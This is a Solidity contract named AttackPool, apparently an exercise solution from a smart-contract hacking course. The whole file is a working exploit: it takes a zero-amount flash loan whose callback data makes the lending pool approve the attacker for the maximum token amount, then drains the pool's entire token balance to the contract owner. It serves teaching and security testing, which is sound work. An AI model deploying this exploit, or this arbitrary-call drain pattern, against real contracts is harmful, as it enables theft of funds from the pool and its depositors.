// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function requestFlashLoan(uint256 amount, address borrower, address target, bytes calldata data) external;
}

/**
 * @title AttackPool
 * @author JohnnyTime (https://smartcontractshacking.com)
 */
contract AttackPool{

    IERC20 immutable token;
    IPool immutable pool;
    address immutable owner;

    constructor(address _poolAddress, address _tokenAddress) {
        token = IERC20(_tokenAddress);
        pool = IPool(_poolAddress);
        owner = msg.sender;
    }

    function attack() external {

        require(msg.sender == owner, "not owner");

        bytes memory dataEncodedWithSignature = abi.encodeWithSignature("approve(address,uint256)", address(this), 2 ** 256 - 1);
        bytes memory dataEncodedWithSelctor = abi.encodeWithSelector(IERC20.approve.selector, address(this), 2 ** 256 - 1);

        pool.requestFlashLoan(0, address(this), address(token), dataEncodedWithSignature);

        uint256 balance = token.balanceOf(address(pool));
        token.transferFrom(address(pool), owner, balance);
    }
}
